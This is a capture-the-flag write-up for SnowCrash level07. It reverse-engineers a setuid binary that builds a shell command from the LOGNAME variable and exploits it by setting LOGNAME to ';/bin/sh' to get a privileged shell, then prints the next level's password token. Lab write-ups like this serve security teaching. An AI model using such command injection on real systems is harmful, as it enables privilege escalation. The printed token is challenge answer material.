****************************************
*               Level 07               *
****************************************

Description :

Let's explore :

level07@SnowCrash:~$ ls
level07

There is a binary and nothing else, let's run it :

level07@SnowCrash:~$ ./level07
level07

Nothing interesting, it just prints its name...

Let's see its permissions :

level07@SnowCrash:~$ ls -la level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

So, this too has the same 's' flag like the binary in level 6 (and here too the owner is "flag07")

So, maybe we need to exploit this binary in some way ? Maybe we can make it execute the "getflag" command and print the next flag ?

Let's examine the permissions :

level07@SnowCrash:~$ ls -la level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

So, this means that this file runs as flag07 !

Ok, let's try to disassemble it using gdb :

(gdb) disas main
Dump of assembler code for function main:
   0x08048514 <+0>:     push   %ebp
   0x08048515 <+1>:     mov    %esp,%ebp
   0x08048517 <+3>:     and    $0xfffffff0,%esp
   0x0804851a <+6>:     sub    $0x20,%esp
   0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:    mov    %eax,0x18(%esp)
   0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:    mov    %eax,0x1c(%esp)
   0x0804852f <+27>:    mov    0x18(%esp),%eax
   0x08048533 <+31>:    mov    %eax,0x8(%esp)
   0x08048537 <+35>:    mov    0x18(%esp),%eax
   0x0804853b <+39>:    mov    %eax,0x4(%esp)
   0x0804853f <+43>:    mov    0x18(%esp),%eax
   0x08048543 <+47>:    mov    %eax,(%esp)
   0x08048546 <+50>:    call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:    mov    0x1c(%esp),%eax
   0x0804854f <+59>:    mov    %eax,0x8(%esp)
---Type <return> to continue, or q <return> to quit---
   0x08048553 <+63>:    mov    0x1c(%esp),%eax
   0x08048557 <+67>:    mov    %eax,0x4(%esp)
   0x0804855b <+71>:    mov    0x1c(%esp),%eax
   0x0804855f <+75>:    mov    %eax,(%esp)
   0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:    movl   $0x0,0x14(%esp)
   0x0804856f <+91>:    movl   $0x8048680,(%esp)
   0x08048576 <+98>:    call   0x8048400 <getenv@plt>
   0x0804857b <+103>:   mov    %eax,0x8(%esp)
   0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt>
   0x0804859f <+139>:   leave  
   0x080485a0 <+140>:   ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.


We can deduct that the code (which only has a main function), must have this look in C :

#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int main(int argc, char **argv, char **envp)
{
    __gid_t gid;
    __uid_t uid;
  
    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    char *buffer = NULL;				// variable (string) declarations

    char *something = getenv("LOGNAME");		// get the value of the environment variable named "LOGNAME" and save it in a variable (string)
    asprintf(&buffer, "/bin/echo %s", something);	// in the string "/bin/echo %s" replace the "%s" with "something" (the LOGNAME value) and save the result in "buffer"

    system(buffer);					// call the system with the "buffer" string (that now contains "/bin/echo <something>" = this executes a shell command)
}

This seems similar to the binary we found in "level03" (but here we have a "buffer" string that holds a shell command which we can edit/spoof with the present "asprintf"). It's just that now at the end the code executes a shell command that is built from an environment variable named "LOGNAME" (that we can see its current value is "level07" when runnning "env").

So from all these, we can easily understand what the exploit is, we must :

- overwrite the environment variable named "LOGNAME" with a shellcode (a simple code to open a new shell inside the program)
- run the binary "level07", it will read the "LOGNAME" and will run your shellcode and open a terminal inside its proper execution as/with "flag07" priviledges
- inside this elevated shell, we type the command "getflag" (you are "flag07" now) to get the next flag

level07@SnowCrash:~$ export LOGNAME=';/bin/sh'
level07@SnowCrash:~$ ./level07

$ getflag
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
$ exit

Let's use it :

level07@SnowCrash:~$ su level08
Password: fiumuikeil55xe9cu4dood66h

level08@SnowCrash:~$ 
